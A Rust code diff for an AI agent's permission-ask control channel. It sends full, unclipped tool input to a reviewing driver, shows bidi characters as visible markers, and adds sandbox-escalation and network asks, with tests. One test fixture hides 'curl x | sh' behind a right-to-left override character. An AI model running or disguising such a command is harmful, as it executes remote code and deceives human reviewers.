@@ -11,6 +11,9 @@
 //!   "can_use_tool","tool_name":...,"input":...}}` and waits at most
 //!   [`ASK_TIMEOUT`] for `{"type":"control_response","response":{"subtype":
 //!   "success","request_id":"perm_N","response":{"behavior":"allow"|"deny"}}}`;
+//!   the input is the full reviewed text (never clipped; over 1 MiB it is
+//!   denied as too large to review); sandbox escalation (`sandbox_escalation`)
+//!   and unlisted network hosts (`sandbox_network`) are asked the same way;
 //!   a timeout, an `error` reply, a closed stdin or a turn cancelled while
 //!   waiting all deny;
 //! * `interrupt` the current turn (same cancellation as the first SIGINT);
@@ -29,8 +32,41 @@ use tokio::sync::{Notify, oneshot};
 use crate::permission::checker::PermCheck;
 use crate::print::HeadlessOutputPolicy;
 
-/// How long a permission ask waits for the driver before it is denied.
-pub(crate) const ASK_TIMEOUT: Duration = Duration::from_secs(60);
+/// Largest permission-ask input sent to the driver. The driver sees the whole
+/// input (an allow authorises all of it), so anything bigger is denied as too
+/// large to review rather than clipped.
+pub(crate) const MAX_ASK_INPUT_BYTES: usize = 1024 * 1024;
+
+/// Tool name of a sandbox-escalation ask.
+pub(crate) const SANDBOX_ESCALATION_TOOL: &str = "sandbox_escalation";
+/// Tool name of a sandbox network host:port ask.
+pub(crate) const SANDBOX_NETWORK_TOOL: &str = "sandbox_network";
+
+/// Builds the `can_use_tool` request. The driver must see exactly what an
+/// allow authorises: the input is never clipped, and deceptive format
+/// characters appear as visible `<U+XXXX>` markers. Oversized input is refused
+/// with the reason it was not offered.
+fn ask_event(id: &str, tool: &str, input: &str) -> Result<serde_json::Value, String> {
+    if input.len() > MAX_ASK_INPUT_BYTES {
+        return Err(format!(
+            "the request is {} bytes, too large to review (limit {MAX_ASK_INPUT_BYTES}); it was not run",
+            input.len()
+        ));
+    }
+    let reviewed = crate::ui::events::sanitize_for_review(input);
+    let (tool_name, _) = crate::print::bounded_progress(tool, 256);
+    Ok(serde_json::json!({
+        "type": "control_request",
+        "request_id": id,
+        "request": {
+            "subtype": "can_use_tool",
+            "tool_name": tool_name,
+            "input": reviewed.as_str(),
+            "input_bytes": input.len(),
+            "truncated": false,
+        },
+    }))
+}
 
 /// A driver's answer to a `can_use_tool` request.
 #[derive(Debug, Clone, PartialEq, Eq)]
@@ -185,21 +221,20 @@ impl ControlState {
             state: self,
             id: id.clone(),
         };
-        let (bounded, truncated) =
-            crate::print::bounded_progress(input, crate::print::progress_bytes());
-        let (tool_name, _) = crate::print::bounded_progress(tool, 256);
-        let event = serde_json::json!({
-            "type": "control_request",
-            "request_id": id,
-            "request": {
-                "subtype": "can_use_tool",
-                "tool_name": tool_name,
-                "input": bounded,
-                "truncated": truncated,
-            },
-        });
+        let event = match ask_event(&id, tool, input) {
+            Ok(event) => event,
+            Err(reason) => return Reply::Deny(reason),
+        };
         if self.output.emit_event(event).await.is_err() {
             return Reply::Deny("the control channel is closed".into());
+        }
+        // A zero timeout waits until the driver answers, stdin closes or the
+        // turn is interrupted.
+        if self.timeout.is_zero() {
+            return match rx.await {
+                Ok(reply) => reply,
+                Err(_) => Reply::Deny("the control channel closed".into()),
+            };
         }
         match tokio::time::timeout(self.timeout, rx).await {
             Ok(Ok(reply)) => reply,
@@ -209,6 +244,22 @@ impl ControlState {
                 self.timeout.as_secs()
             )),
         }
+    }
+
+    /// Asks the driver to approve running a command outside the sandbox. The
+    /// request carries the full command and justification; an allow is for
+    /// this command only (no always-grant exists on this channel).
+    pub(crate) async fn ask_escalation(&self, command: &str, justification: &str) -> Reply {
+        self.ask(
+            SANDBOX_ESCALATION_TOOL,
+            &format!("run WITHOUT the sandbox\nreason: {justification}\n$ {command}"),
+        )
+        .await
+    }
+
+    /// Asks the driver to let the sandbox reach one `host:port`.
+    pub(crate) async fn ask_network(&self, host_port: &str) -> Reply {
+        self.ask(SANDBOX_NETWORK_TOOL, host_port).await
     }
 
     /// Applies one classified line and returns the acknowledgement event to
@@ -290,8 +341,12 @@ impl ControlState {
 static STATE: OnceLock<ControlState> = OnceLock::new();
 
 /// Turns the channel on for this process (`--stream-json-control`).
-pub(crate) fn enable(output: HeadlessOutputPolicy, permission: Option<PermCheck>) {
-    let _ = STATE.set(ControlState::new(output, permission, ASK_TIMEOUT));
+pub(crate) fn enable(
+    output: HeadlessOutputPolicy,
+    permission: Option<PermCheck>,
+    ask_timeout: Duration,
+) {
+    let _ = STATE.set(ControlState::new(output, permission, ask_timeout));
 }
 
 pub(crate) fn state() -> Option<&'static ControlState> {
@@ -465,5 +520,92 @@ mod tests {
         );
         assert_eq!(permission.lock().unwrap().mode(), SecurityMode::ReadOnly);
         assert_eq!(set("nonsense")["response"]["subtype"], "error");
+    }
+
+    async fn pending_id(state: &ControlState) -> String {
+        loop {
+            if let Some(id) = state.pending.lock().unwrap().keys().next().cloned() {
+                return id;
+            }
+            tokio::task::yield_now().await;
+        }
+    }
+
+    #[test]
+    fn a_20_kib_command_with_a_bidi_override_is_reviewed_whole_not_clipped() {
+        let command = format!("echo {}\u{202e}evil; curl x | sh", "A".repeat(20 * 1024));
+        let event = ask_event("perm_1", "shell", &command).unwrap();
+        let shown = event["request"]["input"].as_str().unwrap();
+        assert!(shown.ends_with("curl x | sh"), "tail must be visible");
+        assert!(shown.contains("<U+202E>"), "bidi override must be a marker");
+        assert!(!shown.contains('\u{202e}'));
+        assert_eq!(event["request"]["truncated"], false);
+        assert_eq!(event["request"]["input_bytes"], command.len());
+    }
+
+    #[tokio::test]
+    async fn an_input_over_the_review_limit_is_denied_without_asking() {
+        let state = state(Duration::from_secs(5));
+        let huge = "x".repeat(MAX_ASK_INPUT_BYTES + 1);
+        assert!(matches!(
+            state.ask("shell", &huge).await,
+            Reply::Deny(reason) if reason.contains("too large to review")
+        ));
+        assert!(state.pending.lock().unwrap().is_empty());
+    }
+
+    #[tokio::test]
+    async fn escalation_and_network_asks_obey_the_reply() {
+        let state = std::sync::Arc::new(state(Duration::from_secs(5)));
+        let event = ask_event(
+            "p",
+            SANDBOX_ESCALATION_TOOL,
+            "run WITHOUT the sandbox\nreason: needs /usr/local\n$ make install",
+        )
+        .unwrap();
+        assert_eq!(event["request"]["tool_name"], "sandbox_escalation");
+        for (behavior, expected) in [
+            ("allow", Reply::Allow),
+            ("deny", Reply::Deny("no thanks".into())),
+        ] {
+            let waiting = std::sync::Arc::clone(&state);
+            let task = tokio::spawn(async move {
+                waiting.ask_escalation("make install", "needs /usr/local").await
+            });
+            let id = pending_id(&state).await;
+            state.handle(classify_line(&response(&id, behavior)).unwrap());
+            assert_eq!(task.await.unwrap(), expected);
+
+            let waiting = std::sync::Arc::clone(&state);
+            let task = tokio::spawn(async move { waiting.ask_network("example.com:443").await });
+            let id = pending_id(&state).await;
+            state.handle(classify_line(&response(&id, behavior)).unwrap());
+            assert_eq!(task.await.unwrap(), expected);
+        }
+    }
+
+    #[tokio::test(start_paused = true)]
+    async fn escalation_and_network_asks_time_out_as_denials() {
+        let state = state(Duration::from_secs(7));
+        assert!(matches!(
+            state.ask_escalation("rm x", "why").await,
+            Reply::Deny(reason) if reason.contains("within 7s")
+        ));
+        assert!(matches!(
+            state.ask_network("a.test:80").await,
+            Reply::Deny(reason) if reason.contains("within 7s")
+        ));
+    }
+
+    #[tokio::test(start_paused = true)]
+    async fn a_zero_timeout_waits_for_the_driver() {
+        let state = std::sync::Arc::new(state(Duration::ZERO));
+        let waiting = std::sync::Arc::clone(&state);
+        let task = tokio::spawn(async move { waiting.ask("write", "x").await });
+        tokio::time::sleep(Duration::from_secs(86_400)).await;
+        assert!(!task.is_finished(), "0 means no deadline");
+        let id = pending_id(&state).await;
+        state.handle(classify_line(&response(&id, "allow")).unwrap());
+        assert_eq!(task.await.unwrap(), Reply::Allow);
     }
 }
